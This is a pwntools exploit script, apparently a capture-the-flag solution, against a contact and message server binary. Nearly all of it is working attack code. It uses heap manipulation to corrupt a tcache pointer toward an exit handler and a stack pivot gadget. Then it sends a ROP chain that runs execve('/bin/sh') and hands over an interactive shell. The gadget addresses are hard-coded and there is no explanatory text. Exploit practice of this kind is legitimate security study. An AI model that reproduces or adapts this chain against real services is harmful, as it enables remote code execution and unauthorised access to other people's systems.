from pwn import *
import sys, os

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "./server"

try:
  r = remote(sys.argv[1], int(sys.argv[2]))
except:
  r = process(bin_name) #, env = {})


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

elf = ELF (bin_name);
context.word_size = elf.elfclass

#libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc

context.terminal = ["tmux", "splitw", "-h"]
#context.log_level = 'debug'

def rr ():
  r.recvuntil (": ")

def menu (idx):
  rr ()
  r.sendline (str(idx))

def send_xdr (buf, b="\x00"):
  r.send (buf.ljust (0x1000, b))

def recv_xdr (n=1, raw=False):
  return '\n'.join ([r.recvn(0x1000) if raw else r.recvn(0x1000).replace("\x00", "") for i in xrange(n)])

def pad_msg(msg):
    return msg + '\x00' * ( (-len(msg)) % 4 )

def add_contacts(num, contacts, ips):
  ret = p32(1, endian='big') + p32(num, endian='big')
  assert len(contacts) == len(ips)
  for i in range(num):
    contact, ip = contacts[i], ips[i]
    ret += p32(len(contact), endian='big')
    ret += contact + '\x00' * ( (-len(contact)) % 4)
    ret += p32(len(ip), endian='big')
    ret += ip + '\x00' * ( (-len(ip)) % 4)

    return ret
  
def add_contact (contact, ip):
  send_xdr (add_contacts(1, [contact], [ip]).ljust (4096, "\x00"))
  return recv_xdr ()

def list_contacts ():
  send_xdr (p32(2, endian='big'))
  return recv_xdr ()

def add_message(idx, msglen, msg=None):
  ret = p32(4, endian='big') + p32(idx, endian='big')
  ret += p32(msglen, endian='big')
  if msg is not None:
      ret += pad_msg(msg)
  send_xdr (ret)
  return recv_xdr ()

def list_message(n=1):
  send_xdr (p32(5, endian='big'))
  return recv_xdr (n)

def del_message(idx):
  send_xdr (p32(6, endian='big') + p32(idx, endian='big'))
  return recv_xdr ()
  

libc_free = 0x420A10 
send_string = 0x00400C6B
xdr_destroy = 0x6B9178
stack_chk_fail = 0x44C8A0 
libc_write = 0x044A230
call_destroy_inner = 0x400c6b
call_destroy_main= 0x401802
IO_fputs = 0x471EB0
read_gadget = 0x04016DC  
exit_handler = 0x6be388
add_rsp = 0x0045d2d9

cmd = """
c
""".format (free=libc_free, send_string=send_string, call_destroy=call_destroy_inner, call_destroy2=call_destroy_main)
do_debug (cmd)

add_contact("A"*0x20, "128.199.231.44")
list_contacts ()

pay = "A"*0x20
add_message (0, len(pay), pay)
list_message ()
del_message (0)
add_message (0, 0x1001)
del_message (0)

log.info ("corrupt tcache fd")
pay = p32(exit_handler).ljust (0x20, "\x00")
print add_message (0, len(pay), pay)
#pay = p32(stack_chk_fail).ljust (0x20, "\x00")
pay = "A"*0x20
print add_message (0, len(pay), pay)
pay = p32(add_rsp).ljust (0x20, "\x00")
#pay = "A"*0x20
print add_message (0, len(pay), pay)

prdi = 0x00493c4f
prsi = 0x00490773
prdx = 0x0044c7a6
prax = 0x0044a11c
syscall = 0x004ab70b
movrsirax = 0x00000000004819d1
pppr = 0x0000000000410dee

rop_pay = p64(prax) + "/bin/sh\x00" + p64(prsi) + p64(elf.bss(0x200)) + p64(movrsirax)
rop_pay += p64(prsi) + p64(0) + p64(prdx) + p64(0)  + p64(prdi) + p64(elf.bss(0x200))
rop_pay += p64(prax) + p64(59) + p64(syscall)
r.sendline ("\x00"*8 + "A" * 0xa8 + rop_pay)


r.interactive ()
